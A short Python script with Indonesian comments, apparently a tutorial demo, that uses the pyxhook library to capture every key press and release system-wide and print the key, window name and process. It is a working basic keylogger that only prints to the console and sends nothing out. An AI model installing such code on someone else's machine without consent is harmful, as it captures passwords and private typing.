import pyxhook

# fungsi ini akan dipanggil ketika data dari keylogger perlu untuk ditampilkan atau diambil
def OnKeyboardEvent(event):
    """
    Event pada keyboard yang ada di pyxhook:
    + Window         : menghandle window
    + WindowName     : nama dari window
    + WindowProcName : proses backend dari window
    + Key            : tombol yang ditekan
    + Ascii          : nilai ascii dari tombol yang ditekan
                       nilai ascii ini akan mengembalikan nilai 0 jika nilai ascii tidak di antara 31 dan 256
    + MessageName    : memunculkan pesan tombol yang ditekan pada keyboard
                       - key down <- jika mengatur KeyDown pada hook manager
                       - key up <- jika mengatur KeyUp pada hook manager
    """
    print('Window:',event.Window)
    print('Window Name:',event.WindowName)
    print('Window Proc Name:',event.WindowProcName)
    print('Key:',event.Key)
    print('Ascii:',event.Ascii)
    print('Message Name:',event.MessageName)
    print('-------------------')

# membuat sebuah hook manager
hookManager = pyxhook.HookManager()

# memanggil fungsi OnKeyboardEvent ketika tombol pada keyboard ditekan
hookManager.KeyDown = OnKeyboardEvent

# memanggil fungsi OnKeyboardEvent ketika tombol pada keyboard dilepas
hookManager.KeyUp = OnKeyboardEvent

# menyiapkan hook
hookManager.HookKeyboard()

# memulai pemantauan
hookManager.start()